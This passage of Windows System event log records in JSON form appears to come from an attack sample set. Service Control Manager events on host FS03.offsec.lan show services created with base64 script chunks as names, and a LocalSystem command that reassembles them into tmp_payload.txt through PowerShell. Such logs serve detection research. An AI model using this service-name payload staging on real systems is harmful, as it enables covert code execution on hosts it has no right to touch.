                "Level": "2",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:28.243328+00:00"
                },
                "EventRecordID": "9952",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "param1",
                        "#text": "30000"
                    },
                    {
                        "@Name": "param2",
                        "#text": "AgICAgICAgICAgICAkQ29tcHV0ZXJMaXN0ID0gR2V0LUNvbnRlbnQgJENvbXB1dGVyTGlzdA0KDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgJExP"
                    }
                ],
                "Binary": "cwBlAGcAMgAxADYAAAA="
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "49152",
                    "#text": "7000"
                },
                "Version": "0",
                "Level": "2",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:28.243328+00:00"
                },
                "EventRecordID": "9953",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "param1",
                        "#text": "AgICAgICAgICAgICAkQ29tcHV0ZXJMaXN0ID0gR2V0LUNvbnRlbnQgJENvbXB1dGVyTGlzdA0KDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgJExP"
                    },
                    {
                        "@Name": "param2",
                        "#text": "%%1053"
                    }
                ],
                "Binary": "cwBlAGcAMgAxADYAAAA="
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "16384",
                    "#text": "7045"
                },
                "Version": "0",
                "Level": "4",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:29.321718+00:00"
                },
                "EventRecordID": "9954",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": "S-1-5-21-4230534742-2542757381-3142984815-1111"
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "ServiceName",
                        "#text": "Q0FMSE9TVF9PUFQgew0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICRDb21wdXRlckxpc3QgPSAibG9jYWxob3N0Ig0KDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgIC"
                    },
                    {
                        "@Name": "ImagePath",
                        "#text": "c:\\windows\\system32\\cmd.exe /c powershell -command \"Get-Service \"seg217\" | select -Expand DisplayName |out-file -append tmp_payload.txt\""
                    },
                    {
                        "@Name": "ServiceType",
                        "#text": "user mode service"
                    },
                    {
                        "@Name": "StartType",
                        "#text": "demand start"
                    },
                    {
                        "@Name": "AccountName",
                        "#text": "LocalSystem"
                    }
                ]
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "49152",
                    "#text": "7009"
                },
                "Version": "0",
                "Level": "2",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:29.700830+00:00"
                },
                "EventRecordID": "9955",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "param1",
                        "#text": "30000"
                    },
                    {
                        "@Name": "param2",
                        "#text": "Q0FMSE9TVF9PUFQgew0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICRDb21wdXRlckxpc3QgPSAibG9jYWxob3N0Ig0KDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgIC"
                    }
                ],
                "Binary": "cwBlAGcAMgAxADcAAAA="
            }
        }
    },
